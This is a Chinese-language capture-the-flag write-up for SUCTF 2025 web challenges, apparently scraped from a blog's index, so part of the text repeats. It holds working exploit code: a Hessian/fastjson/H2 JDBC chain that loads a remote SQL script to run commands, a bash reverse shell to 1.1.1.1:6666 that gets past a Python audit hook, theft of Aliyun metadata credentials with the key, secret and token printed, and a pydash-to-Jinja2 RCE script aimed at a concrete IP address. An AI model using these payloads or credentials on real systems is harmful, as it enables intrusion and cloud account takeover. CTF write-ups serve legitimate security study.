不过他这个反序列化还给了一个toString()的调用\n然后再观察一下给的依赖\n... \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;hessian\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.5\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa.common\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;sofa-common-tools\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.83\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.h2database\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;h2\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.2.224\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; h2和fastjson这俩依赖写一起的，再加上上面的toString(),指向型很强了,就是让我们利用fastjson的getter打一个JDBC攻击\n做题过程 做题的时候找了有几个能打通的类，但都因为sofa-hessian自带的反序列化名单被做掉了\n我们需要知道在打h2的jdbc时，最后都会走向哪个类的哪个方法\norg.h2.jdbc.JdbcConnection.JdbcConnection()\n就是JdbcConnection的构造方法，以此为根据去找哪些getter会实例化一个JdbcConnection类\n这里可以写codeql来找，我有点懒没咋写，这里写我找到的两个方法\norg.h2.jdbcx.JdbcDataSource.getConnection() org.noear.solon.data.util.UnpooledDataSource 第一个被黑名单ban了，但是它给了我们些许灵感，JdbcDataSource类实现了DataSource接口，继承这个接口的类都要重写getConnection()方法，所以我们可以去根据继承关系来寻找适合的方法\n所以我们找到了UnpooledDataSource方法，即不在黑名单上，而且他的构造方法和getConnection也很有意思\npublic UnpooledDataSource(String url, String username, String password, String driverClassName) { if (Utils.isEmpty(url)) { throw new IllegalArgumentException(\u0026#34;Invalid ds url parameter\u0026#34;); } else { this.logWriter = new PrintWriter(System.out); this.url = url; this.username = username; this.password = password; this.setDriverClassName(driverClassName); } } public Connection getConnection() throws SQLException { return this.username == null ? DriverManager.getConnection(this.url) : DriverManager.getConnection(this.url, this.username, this.password); } 构造方法会自动根据你的driverClassName来注册对应驱动类，然后getConnection()也会直接从DriverManager中进行Connection操作，泛用性很强\n然后后面常规打h2RCE的思路了，有一个SecurityManager要绕，其实直接调用setSecurityManager(null)就好了\npublic static void main(String[] args) throws Exception{ UnpooledDataSource unpooledDataSource = new UnpooledDataSource(\u0026#34;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM \u0026#39;http://127.0.0.1:8000/poc.sql\u0026#39;\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;org.h2.Driver\u0026#34;); unpooledDataSource.setLogWriter(null); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;xx\u0026#34;, unpooledDataSource); String payload =Util.hessianSerialize(jsonObject); System.out.println(URLEncoder.encode(payload, \u0026#34;UTF-8\u0026#34;)); Util.hessianDeserialize(payload); } poc.sql\nCREATE ALIAS GSBPPP12 AS $$ String shellexec(String cmd) throws java.io.IOException { System.setSecurityManager(null);java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; }$$;CALL GSBPPP12(\u0026#39;command what you want execute\u0026#39;); SU_easyk8s_on_aliyun(REALLY VERY EASY) 确实是很简单的一个云渗透\n前面要从python那里拿个shell，不过有hook\nimport sys DBUG = False def audit_hook(event, args): audit_functions = { \u0026#34;os.system\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.Popen\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_output\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;_posixsubprocess.fork_exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawn\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnlp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnv\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvpe\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.fork\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;shutil.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlsym\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlopen\u0026#34;: {\u0026#34;ban\u0026#34;: True} } if event in audit_functions: if DEBUG: print(f\u0026#34;[DEBUG] found event {event}\u0026#34;) policy = audit_functions[event] if policy[\u0026#34;ban\u0026#34;]: strr = f\u0026#34;AUDIT BAN : Banning FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) raise PermissionError(f\u0026#34;[AUDIT BANNED]{event} is not allowed.\u0026#34;) else: strr = f\u0026#34;[DEBUG] AUDIT ALLOW : Allowing FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) return sys.addaudithook(audit_hook) 这里_posixsubprocess.fork_exec这个hook是抓不了的，所以它等于白写\n__import__(\u0026#39;_posixsubprocess\u0026#39;).fork_exec( [b\u0026#34;/bin/bash\u0026#34;, b\u0026#34;-c\u0026#34;, b\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/1.1.1.1/6666 0\u0026gt;\u0026amp;1\u0026#34;], [b\u0026#34;/bin/bash\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__import__(\u0026#39;os\u0026#39;).pipe()), False, False, False, None, None, None, -1, None, False ) 直接拿shell，然后用pty升级一下自己的shell\n进shell之后要信息搜集一下，这里常用思路就是用cdk_linux_amd64\n... [ Information Gathering - Net Namespace ] container net namespace isolated. [ Information Gathering - Sysctl Variables ] 2025/01/12 08:57:58 net.ipv4.conf.all.route_localnet = 1 2025/01/12 08:57:58 You may be able to access the localhost service of the current container node or other nodes. [ Information Gathering - DNS-Based Service Discovery ] error when requesting coreDNS: lookup any.any.svc.cluster.local. on 10.43.0.10:53: no such host error when requesting coreDNS: lookup any.any.any.svc.cluster.local. on 10.43.0.10:53: no such host [ Discovery - K8s API Server ] 2025/01/12 08:57:58 checking if api-server allows system:anonymous request. err found in post request, error response code: 401 Unauthorized. api-server forbids anonymous request. response:{\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;code\u0026#34;:401} [ Discovery - K8s Service Account ] service-account is available 2025/01/12 08:57:58 trying to list namespaces err found in post request, error response code: 403 Forbidden. [ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 2025/01/12 08:57:59 failed to dial Azure API. 2025/01/12 08:57:59 failed to dial Google Cloud API. 2025/01/12 08:57:59 failed to dial Tencent Cloud API. 2025/01/12 08:58:00 failed to dial OpenStack API. 2025/01/12 08:58:01 failed to dial Amazon Web Services (AWS) API. 2025/01/12 08:58:02 failed to dial ucloud API. ... 与题目名字相结合，知道了关键信息\n[ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 然后去看文档\n很明显在题目内是没有开加固模式的,我们这里直接访问就好\n然后拿到了一个ak/sk\n{ \u0026#34;AccessKeyId\u0026#34; : \u0026#34;STS.NTfZuo3n761cQMys2MNiNBo9a\u0026#34;, \u0026#34;AccessKeySecret\u0026#34; : \u0026#34;5zbrTpf6iWzMu6DdPpy42ZCj2kDfrwbte4JT9LLCQBzY\u0026#34;, \u0026#34;Expiration\u0026#34; : \u0026#34;2025-01-12T14:05:03Z\u0026#34;, \u0026#34;SecurityToken\u0026#34; : \u0026#34;CAIS1AJ1q6Ft5B2yfSjIr5fTEc/b3rEWgfOIU2vIlzIYQuZiraqSgzz2IHhMdHRqBe0ctvQ+lG5W6/4YloltTtpfTEmBc5I179Fd6VqqZNTZqcy74qwHmYS1RXadFEZYDnNszr+rIunGc9KBNnrm9EYqs5aYGBymW1u6S+7r7bdsctUQWCShcDNCH604DwB+qcgcRxCzXLTXRXyMuGfLC1dysQdRkH527b/FoveR8R3Dllb3uIR3zsbTWsH6MZc1Z8wkDovsjbArKvL7vXQOu0QQxsBfl7dZ/DrLhNaZDmRK7g+OW+iuqYU3fFIjOvVgQ/4V/KaiyKUioIzUjJ+y0RFKIfHnm/ES9DUVqiGtOpRKVr5RHd6TUxxGgmVUsD3M+Eqi7Sau0K+e5xjFvkUxaHpiA3iRUcyMsxuRQWyIEOP+y9oVsqEYoRiWu7TDSTeBK6PPRvNGUvdUGoABfmqFersd5q3sAhpi7UHmtkhuEn8jODpY4bxubpPLrQwZu7ToyzoWY9vERJzKarge1l3oM9jQP+q30t86v6WxFy2RHh97iDaIEUh3gpL9Mxu9fi4aRYzPZ2qhdZNCdWlE3CrGCuPAsoU0g3JUohJJnycnBj9o54Tdk4cTkjugEyUgAA==\u0026#34;, \u0026#34;LastUpdated\u0026#34; : \u0026#34;2025-01-12T08:05:03Z\u0026#34;, \u0026#34;Code\u0026#34; : \u0026#34;Success\u0026#34; } 很明显就是要我们去oss🪣里看flag，上去发现被删了，不过没多大问题，这里我们看之前版本的内容就好了\nSU_blog 注册接口有个任意用户密码重置的洞，这里直接用admin做用户名就能重置admin的密码了\n也省了后面爆破jwt密钥的操作\n看到article里的传参，很明显的文件路径，这里尝试一下能不能路径穿越\n发现加../和不加是一样的，猜测后端进行了replace操作\n所以试一下双写..../，然后就能读了\n读到源码和waf(waf我这里用waf\u0026hellip;/py来绕过读到)\nfrom flask import * import time, os, json, hashlib from pydash import set_ from waf import pwaf, cwaf app = Flask(__name__) app.config[\u0026#39;SECRET_KEY\u0026#39;] = hashlib.md5(str(int(time.time())).encode()).hexdigest() users = {\u0026#34;testuser\u0026#34;: \u0026#34;password\u0026#34;} BASE_DIR = \u0026#39;/var/www/html/myblog/app\u0026#39; articles = { 1: \u0026#34;articles/article1.txt\u0026#34;, 2: \u0026#34;articles/article2.txt\u0026#34;, 3: \u0026#34;articles/article3.txt\u0026#34; } friend_links = [ {\u0026#34;name\u0026#34;: \u0026#34;bkf1sh\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://ctf.org.cn/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;fushuling\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://fushuling.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;yulate\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.yulate.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;zimablue\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.zimablue.life/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;baozongwi\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://baozongwi.xyz/\u0026#34;} ] class User: def __init__(self): pass user_data = User() @app.route(\u0026#39;/\u0026#39;) def index(): if \u0026#39;username\u0026#39; in session: return render_template(\u0026#39;blog.html\u0026#39;, articles=articles, friend_links=friend_links) return redirect(url_for(\u0026#39;login\u0026#39;)) @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] if username in users and users[username] == password: session[\u0026#39;username\u0026#39;] = username return redirect(url_for(\u0026#39;index\u0026#39;)) else: return \u0026#34;Invalid credentials\u0026#34;, 403 return render_template(\u0026#39;login.html\u0026#39;) @app.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def register(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] users[username] = password return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;register.html\u0026#39;) @app.route(\u0026#39;/change_password\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def change_password(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) if request.method == \u0026#39;POST\u0026#39;: old_password = request.form[\u0026#39;old_password\u0026#39;] new_password = request.form[\u0026#39;new_password\u0026#39;] confirm_password = request.form[\u0026#39;confirm_password\u0026#39;] if users[session[\u0026#39;username\u0026#39;]] != old_password: flash(\u0026#34;Old password is incorrect\u0026#34;, \u0026#34;error\u0026#34;) elif new_password != confirm_password: flash(\u0026#34;New passwords do not match\u0026#34;, \u0026#34;error\u0026#34;) else: users[session[\u0026#39;username\u0026#39;]] = new_password flash(\u0026#34;Password changed successfully\u0026#34;, \u0026#34;success\u0026#34;) return redirect(url_for(\u0026#39;index\u0026#39;)) return render_template(\u0026#39;change_password.html\u0026#39;) @app.route(\u0026#39;/friendlinks\u0026#39;) def friendlinks(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;friendlinks.html\u0026#39;, links=friend_links) @app.route(\u0026#39;/add_friendlink\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def add_friendlink(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) name = request.form.get(\u0026#39;name\u0026#39;) url = request.form.get(\u0026#39;url\u0026#39;) if name and url: friend_links.append({\u0026#34;name\u0026#34;: name, \u0026#34;url\u0026#34;: url}) return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/delete_friendlink/\u0026#39;) def delete_friendlink(index): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) if 0 \u0026lt;= index \u0026lt; len(friend_links): del friend_links[index] return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/article\u0026#39;) def article(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) file_name = request.args.get(\u0026#39;file\u0026#39;, \u0026#39;\u0026#39;) if not file_name: return render_template(\u0026#39;article.html\u0026#39;, file_name=\u0026#39;\u0026#39;, content=\u0026#34;未提供文件名。\u0026#34;) blacklist = [\u0026#34;waf.py\u0026#34;] if any(blacklisted_file in file_name for blacklisted_file in blacklist): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;大黑阔不许看\u0026#34;) if not file_name.startswith(\u0026#39;articles/\u0026#39;): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;无效的文件路径。\u0026#34;) if file_name not in articles.values(): if session.get(\u0026#39;username\u0026#39;) != \u0026#39;admin\u0026#39;: return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;无权访问该文件。\u0026#34;) file_path = os.path.join(BASE_DIR, file_name) file_path = file_path.replace(\u0026#39;../\u0026#39;, \u0026#39;\u0026#39;) try: with open(file_path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() except FileNotFoundError: content = \u0026#34;文件未找到。\u0026#34; except Exception as e: app.logger.error(f\u0026#34;Error reading file {file_path}: {e}\u0026#34;) content = \u0026#34;读取文件时发生错误。\u0026#34; return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=content) @app.route(\u0026#39;/Admin\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def admin(): if request.args.get(\u0026#39;pass\u0026#39;) != \u0026#34;SUers\u0026#34;: return \u0026#34;nonono\u0026#34; if request.method == \u0026#39;POST\u0026#39;: try: body = request.json if not body: flash(\u0026#34;No JSON data received\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;No JSON data received\u0026#34;}), 400 key = body.get(\u0026#39;key\u0026#39;) value = body.get(\u0026#39;value\u0026#39;) if key is None or value is None: flash(\u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;}), 400 if not pwaf(key): flash(\u0026#34;Invalid key format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid key format\u0026#34;}), 400 if not cwaf(value): flash(\u0026#34;Invalid value format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid value format\u0026#34;}), 400 set_(user_data, key, value) flash(\u0026#34;User data updated successfully\u0026#34;, \u0026#34;success\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;User data updated successfully\u0026#34;}), 200 except json.JSONDecodeError: flash(\u0026#34;Invalid JSON data\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid JSON data\u0026#34;}), 400 except Exception as e: flash(f\u0026#34;An error occurred: {str(e)}\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: f\u0026#34;An error occurred: {str(e)}\u0026#34;}), 500 return render_template(\u0026#39;admin.html\u0026#39;, user_data=user_data) @app.route(\u0026#39;/logout\u0026#39;) def logout(): session.pop(\u0026#39;username\u0026#39;, None) flash(\u0026#34;You have been logged out.\u0026#34;, \u0026#34;info\u0026#34;) return redirect(url_for(\u0026#39;login\u0026#39;)) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=10000) 除了之前用到的接口，只剩下一个/Admin\n这里有一个原型链污染，不过题目要我们RCE，所以我们要结合一下jinja2的一个模版渲染\nhttps://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/\nwaf里数字只剩下2，也是指引我们打jinja2\n我们还需要获取sys模块，上面文章链接中的一个payload是用了__loader__，但是这题被ban了\n那我们只能用__spec__来代替__loader__来获取到sys模块\n因为模版编译只在第一次访问时才编译，所以要卡容器重启的第一时间才能打通\nexp\nimport requests import multiprocessing js = { \u0026#34;key\u0026#34;: \u0026#34;__class__.__init__.__globals__.__builtins__.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;*;import os;os.system(\u0026#39;/read\\\\x66lag \u0026gt; /tmp/f\u0026#39;)\u0026#34;} def brute(url): while True: try: res = requests.post(url + \u0026#34;/Admin?pass=SUers\u0026#34;, json=js) print(url + \u0026#34;:\u0026#34; + res.text) requests.get(url + \u0026#34;/Admin?pass=SUers\u0026#34;) requests.get(url + \u0026#34;/\u0026#34;) requests.get(url + \u0026#34;/login\u0026#34;) requests.get(url + \u0026#34;/register\u0026#34;) except Exception as e: print(e) if __name__ == \u0026#39;__main__\u0026#39;: urls=[\u0026#34;http://27.25.151.48:10000\u0026#34;, \u0026#34;http://27.25.151.48:10001\u0026#34;, \u0026#34;http://27.25.151.48:10002\u0026#34;, \u0026#34;http://27.25.151.48:10003\u0026#34;, \u0026#34;http://27.25.151.48:10004\u0026#34;, \u0026#34;http://27.25.151.48:10005\u0026#34;] for url in urls: p = multiprocessing.Process(target=brute, args=(url,)) p.start() SU_photogallery 由404页面可以很明显的知道是一个临时服务php -S开启的\n再根据去年出的一个洞，由php -S开启的服务在特定版本下能够读取源码\nhttps://cloud.tencent.com/developer/article/2235691\n所以这里也是有模学样的拿到源码\n后续打的时候碰到别人写的shell，然后用源码泄漏看参数就直接打进去了(这也是公共环境做题思路的一部分叭xsl)\n","date":"2025-01-18T19:38:41+08:00","permalink":"http://localhost:1313/post/2025suctf/","section":"post","tags":null,"title":"2025-SUCTF-WP"},{"categories":null,"contents":" 1231 456 友链名称2 友链描述2 ","date":"2025-01-18T01:22:01+08:00","permalink":"http://localhost:1313/friend/","section":"","tags":null,"title":"友链"},{"categories":null,"contents":"一名大二在读学生\nSyclover \u0026amp; 0XFFF 成员\n对各种安全感兴趣，目前主要学习的还的是Web安全（Java 安全、云安全等）\n最爱吃，最喜欢吃的是🍉，最喜欢干的事情就是大夏天抱着半个西瓜拿勺子挖着吃然后看视频\n会打点小游戏（其实从小学之前就开始打游戏了hh\n什么都想学，但什么都不会\nContact Me Email:gsbp6279@gmail.com\nGitHub:https://github.com/GSBP0/:\n","date":"2025-01-17T19:38:41+08:00","permalink":"http://localhost:1313/about/","section":"","tags":null,"title":"About Me"},{"categories":null,"contents":"SU_ez_solon 题目直接给了个hessian反序列化的接口\n// // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package com.example.demo.controller; import com.caucho.hessian.io.Hessian2Input; import java.io.ByteArrayInputStream; import java.util.Base64; import org.noear.solon.annotation.Controller; import org.noear.solon.annotation.Mapping; import org.noear.solon.annotation.Param; @Controller public class IndexController { public IndexController() { } @Mapping(\u0026#34;/hello\u0026#34;) public String hello(@Param(defaultValue = \u0026#34;hello\u0026#34;) String data) throws Exception { byte[] decode = Base64.getDecoder().decode(data); Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream(decode)); Object object = hessian2Input.readObject(); return object.toString(); } } 不过他这个反序列化还给了一个toString()的调用\n然后再观察一下给的依赖\n... \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;hessian\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.5\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa.common\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;sofa-common-tools\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.83\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.h2database\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;h2\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.2.224\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; h2和fastjson这俩依赖写一起的，再加上上面的toString(),指向型很强了,就是让我们利用fastjson的getter打一个JDBC攻击\n做题过程 做题的时候找了有几个能打通的类，但都因为sofa-hessian自带的反序列化名单被做掉了\n我们需要知道在打h2的jdbc时，最后都会走向哪个类的哪个方法\norg.h2.jdbc.JdbcConnection.JdbcConnection()\n就是JdbcConnection的构造方法，以此为根据去找哪些getter会实例化一个JdbcConnection类\n这里可以写codeql来找，我有点懒没咋写，这里写我找到的两个方法\norg.h2.jdbcx.JdbcDataSource.getConnection() org.noear.solon.data.util.UnpooledDataSource 第一个被黑名单ban了，但是它给了我们些许灵感，JdbcDataSource类实现了DataSource接口，继承这个接口的类都要重写getConnection()方法，所以我们可以去根据继承关系来寻找适合的方法\n所以我们找到了UnpooledDataSource方法，即不在黑名单上，而且他的构造方法和getConnection也很有意思\npublic UnpooledDataSource(String url, String username, String password, String driverClassName) { if (Utils.isEmpty(url)) { throw new IllegalArgumentException(\u0026#34;Invalid ds url parameter\u0026#34;); } else { this.logWriter = new PrintWriter(System.out); this.url = url; this.username = username; this.password = password; this.setDriverClassName(driverClassName); } } public Connection getConnection() throws SQLException { return this.username == null ? DriverManager.getConnection(this.url) : DriverManager.getConnection(this.url, this.username, this.password); } 构造方法会自动根据你的driverClassName来注册对应驱动类，然后getConnection()也会直接从DriverManager中进行Connection操作，泛用性很强\n然后后面常规打h2RCE的思路了，有一个SecurityManager要绕，其实直接调用setSecurityManager(null)就好了\npublic static void main(String[] args) throws Exception{ UnpooledDataSource unpooledDataSource = new UnpooledDataSource(\u0026#34;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM \u0026#39;http://127.0.0.1:8000/poc.sql\u0026#39;\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;org.h2.Driver\u0026#34;); unpooledDataSource.setLogWriter(null); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;xx\u0026#34;, unpooledDataSource); String payload =Util.hessianSerialize(jsonObject); System.out.println(URLEncoder.encode(payload, \u0026#34;UTF-8\u0026#34;)); Util.hessianDeserialize(payload); } poc.sql\nCREATE ALIAS GSBPPP12 AS $$ String shellexec(String cmd) throws java.io.IOException { System.setSecurityManager(null);java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; }$$;CALL GSBPPP12(\u0026#39;command what you want execute\u0026#39;); SU_easyk8s_on_aliyun(REALLY VERY EASY) 确实是很简单的一个云渗透\n前面要从python那里拿个shell，不过有hook\nimport sys DBUG = False def audit_hook(event, args): audit_functions = { \u0026#34;os.system\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.Popen\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_output\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;_posixsubprocess.fork_exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawn\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnlp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnv\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvpe\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.fork\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;shutil.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlsym\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlopen\u0026#34;: {\u0026#34;ban\u0026#34;: True} } if event in audit_functions: if DEBUG: print(f\u0026#34;[DEBUG] found event {event}\u0026#34;) policy = audit_functions[event] if policy[\u0026#34;ban\u0026#34;]: strr = f\u0026#34;AUDIT BAN : Banning FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) raise PermissionError(f\u0026#34;[AUDIT BANNED]{event} is not allowed.\u0026#34;) else: strr = f\u0026#34;[DEBUG] AUDIT ALLOW : Allowing FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) return sys.addaudithook(audit_hook) 这里_posixsubprocess.fork_exec这个hook是抓不了的，所以它等于白写\n__import__(\u0026#39;_posixsubprocess\u0026#39;).fork_exec( [b\u0026#34;/bin/bash\u0026#34;, b\u0026#34;-c\u0026#34;, b\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/1.1.1.1/6666 0\u0026gt;\u0026amp;1\u0026#34;], [b\u0026#34;/bin/bash\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__import__(\u0026#39;os\u0026#39;).pipe()), False, False, False, None, None, None, -1, None, False ) 